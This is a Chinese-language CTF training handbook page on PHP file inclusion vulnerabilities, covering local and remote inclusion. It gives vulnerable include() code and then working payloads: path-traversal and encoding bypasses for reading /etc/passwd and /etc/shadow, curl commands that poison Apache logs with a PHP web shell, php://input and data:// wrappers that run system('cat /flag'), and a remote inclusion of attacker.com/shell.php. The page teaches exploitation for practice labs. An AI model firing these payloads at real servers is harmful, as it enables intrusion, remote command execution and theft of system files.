---
title: 文件包含
order: 6
icon: mdi:file-link-outline
category:
  - CTF
  - 手册
  - Web
---

文件包含漏洞（File Inclusion）是指服务器将用户可控的参数作为文件路径，直接包含并执行该文件的内容。

## 漏洞原理

```php
// 漏洞代码
$page = $_GET['page'];
include($page);
```

正常访问：`?page=about.php` → 包含 about.php

攻击访问：`?page=/etc/passwd` → 读取系统文件

## 本地文件包含（LFI）

### 读取敏感文件

```
?page=/etc/passwd
?page=/etc/shadow
?page=/proc/self/environ
?page=/var/log/apache2/access.log
?page=../../../../etc/passwd    # 路径穿越
```

### 路径穿越

当程序限制了目录时，用 `../` 跳出：

```
?page=../../../etc/passwd
?page=....//....//....//etc/passwd   # 双写绕过
?page=..%2F..%2F..%2Fetc%2Fpasswd   # URL 编码
?page=..%252F..%252Fetc%252Fpasswd  # 双重编码
```

### 包含日志文件（日志注入 GetShell）

1. 先把 PHP 代码写进日志：

```bash
# 访问一个带 PHP 代码的 URL，让它被记录到 access.log
curl "http://target/?<?php system(\$_GET['cmd']);?>"
# 或者修改 User-Agent
curl -A "<?php system(\$_GET['cmd']);?>" http://target/
```

2. 然后包含日志文件：

```
?page=/var/log/apache2/access.log&cmd=cat /flag
```

常见日志路径：
- Apache：`/var/log/apache2/access.log`
- Nginx：`/var/log/nginx/access.log`
- SSH：`/var/log/auth.log`

### PHP 伪协议

PHP 提供了多种伪协议，可以绕过路径限制：

```
# 读取 PHP 源码（base64 编码输出，不会被执行）
?page=php://filter/convert.base64-encode/resource=index.php

# 执行 PHP 代码
?page=php://input
# POST 数据：<?php system('cat /flag');?>

# data:// 直接执行代码
?page=data://text/plain,<?php system('cat /flag');?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==
```

## 远程文件包含（RFI）

当 PHP 配置了 `allow_url_include = On` 时，可以包含远程文件：

```
?page=http://attacker.com/shell.php
?page=ftp://attacker.com/shell.php
```

在自己的服务器上放一个 `shell.php`：

```php
<?php system($_GET['cmd']); ?>
```

## 常见绕过

### 后缀限制绕过

```php
// 代码：include($page . ".php");
// 绕过：%00 截断（PHP < 5.3.4）
?page=/etc/passwd%00
```

### 路径限制绕过

```php
// 代码：include("pages/" . $page);
// 绕过：路径穿越
?page=../../../etc/passwd
```

## 课后练习

- [include 进来看](http://172.16.173.140/training/11?challenge=43) — 后端使用了文件包含，尝试读取 `/flag` 中的内容

## 练手资源

- CTFHub 文件包含技能树
- DVWA（File Inclusion 模块）
